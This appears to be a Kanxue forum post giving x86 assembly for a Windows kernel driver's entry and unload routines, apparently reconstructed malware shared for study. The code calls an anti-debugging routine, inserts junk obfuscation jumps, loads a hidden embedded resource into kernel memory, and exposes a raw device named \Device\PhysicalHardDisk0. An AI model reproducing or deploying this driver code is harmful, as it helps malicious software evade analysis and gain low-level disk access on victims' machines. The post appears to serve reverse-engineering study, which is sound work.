
```asm
  push   1    ; AllocateDestinationString  

  lea  eax, DestinationString  

  push   eax    ; SourceString  

  lea  eax, SymbolicLinkName  

  push   eax    ; DestinationString  

  call   RtlAnsiStringToUnicodeString  

  lea  eax, SymbolicLinkName  

  push   eax    ; SymbolicLinkName  

  call   IoDeleteSymbolicLink  

  lea  eax, SymbolicLinkName  

  push   eax    ; UnicodeString  

  call   RtlFreeUnicodeString  

  mov  edi, pDriverObject  

  mov  esi, [edi+4]   ;DeviceObject  

  jmp  IsDeviceExist  

DELETEDEVICE:  

  mov  edi, [esi+0Ch];DriverObject  

  push   esi    ; DeviceObject  

  call   IoDeleteDevice  

  mov  esi, edi  

IsDeviceExist:  

  or   esi, esi  

  jnz  DELETEDEVICE  

QUIT:  

  popa  

  pop  ebx  

  pop  esi  

  pop  edi  

  retn  

PCIHDDUnload endp  

; ********************************************************************************

; 这里是驱动程序的入口处  
; ********************************************************************************

public start  

start proc near  

  LOCAL nTemp:dword  

  LOCAL DestinationString:OEM_STRING  

  LOCAL DeviceObject:dword  

  LOCAL SymbolicLinkName:UNICODE_STRING  

  LOCAL DeviceName:UNICODE_STRING  

  LOCAL DriverObject:dword  

  push   edi  

  push   esi  

  push   ebx  

  pusha  

  nop  

  nop  

  call   AntiDebug ;反调试  

  call   GetPeHeader  

  or   eax, eax  

  jz   QUIT ;没找到当前驱动内存加载位置  

  mov  ecx, eax  

  lea  eax, nTemp  

  push   eax  

  push   3E8h  

  push   3E8h  

  push   ecx  

  call   SearchResourceByIDInFirstLayer  

  or   eax, eax  

  jz   QUIT  

  mov  NumberOfBytes, eax  

  push   NumberOfBytes  ; NumberOfBytes  

  push   0    ; PoolType  

  call   ExAllocatePool ;根据资源长度申请内存  

  mov  P, eax  

  jmp  short $+2 ;花指令  

  mov  edi, P  

  mov  esi, nTemp  

  mov  ecx, NumberOfBytes  

  rep movsb   ;将资源拷贝到缓冲区  

  jmp   ContinueWork  

QUIT:  

  popa  

  xor  eax, eax  

  dec  eax  

  pop  ebx  

  pop  esi  

  pop  edi  

  retn  

ContinueWork:  

  jmp  short $+2 ;花指令  

  mov  eax, DriverObject  

  mov  dword ptr [eax+34h], offset PCIHDDUnload ;DriverObject.DriverUnLoad = PCIHDDUnload  

  lea  edi, [eax+38h]    ;edi 指向 MajorFunction  

  lea  eax, DispatchFunction  

  mov  [edi], eax     ;IRP_MJ_CREATE          EQU    0  

  mov  [edi+8], eax   ;IRP_MJ_CLOSE          equ   2  

  mov  [edi+38h], eax ;IRP_MJ_DEVICE_CONTROL  equ   0Eh  见 ntddk.inc  

  push   offset aDevicePhysical ; "\Device\PhysicalHardDisk0"  

  lea  eax, DestinationString  

  push   eax    ; DestinationString  

  call   RtlInitAnsiString  

  push   1    ; AllocateDestinationString  

  lea  eax, DestinationString  

  push   eax    ; SourceString  

  lea  eax, DeviceName  

  push   eax    ; DestinationString  

  call   RtlAnsiStringToUnicodeString  

  push   offset aDosdevicesPhys ; "\DosDevices\PhysicalHardDisk0"  

  lea  eax, DestinationString  

  push   eax    ; DestinationString  

  call   RtlInitAnsiString  

  push   1    ; AllocateDestinationString  

  lea  eax, DestinationString  

  push   eax    ; SourceString  

  lea  eax, SymbolicLinkName  

  push   eax    ; DestinationString  

  call   RtlAnsiStringToUnicodeString  

  lea  eax, DeviceObject  

  push   eax    ; DeviceObject  

  push   0    ; Exclusive  

  push   0    ; DeviceCharacteristics  

  push   15h    ; DeviceType  

  lea  eax, DeviceName  

  push   eax    ; DeviceName  

  push   0    ; DeviceExtensionSize  

  push   DriverObject; DriverObject  

  call   IoCreateDevice ;创建设备  

  or   eax, eax  

  jz   CreateDeviceSucess  

  jmp   Quit  

CreateDeviceSucess:  

  lea  eax, DeviceName  

  push   eax    ; DeviceName  

  lea  eax, SymbolicLinkName  

  push   eax    ; SymbolicLinkName  

  call   IoCreateSymbolicLink ;创建符号链接  

  or   eax, eax  

  jz   Quit  

  mov  edi, DriverObject  

  mov  esi, [edi+4]      ;DRIVER_OBJECT.DeviceObject  

  jmp  StartCycle  

ContinueDeleteDevice:  

  mov  edi, [esi+0Ch]   ;DEVICE_OBJECT.DriverObject  

  push   esi        ; DeviceObject  

  call   IoDeleteDevice  

  mov  esi, edi  

StartCycle:  

  or   esi, esi  

  jnz  ContinueDeleteDevice  

  jmp  short $+2 ;花指令 ,执行退出指令  

Quit:  

  lea  eax, DeviceName  

  push   eax    ; UnicodeString  

  call   RtlFreeUnicodeString  

  lea  eax, SymbolicLinkName  

  push   eax    ; UnicodeString  

  call   RtlFreeUnicodeString  

  popa  

  xor  eax, eax  

  pop  ebx  

  pop  esi  

  pop  edi  

  retn  

start endp  

end start  
```

声明：本贴仅用于学习用途，转贴须声明来自看雪。

友情提示：

阅读本贴之前要详细了解驱动相关的几个结构体，并好好看看驱动版块最近两天发表的几个帖子。
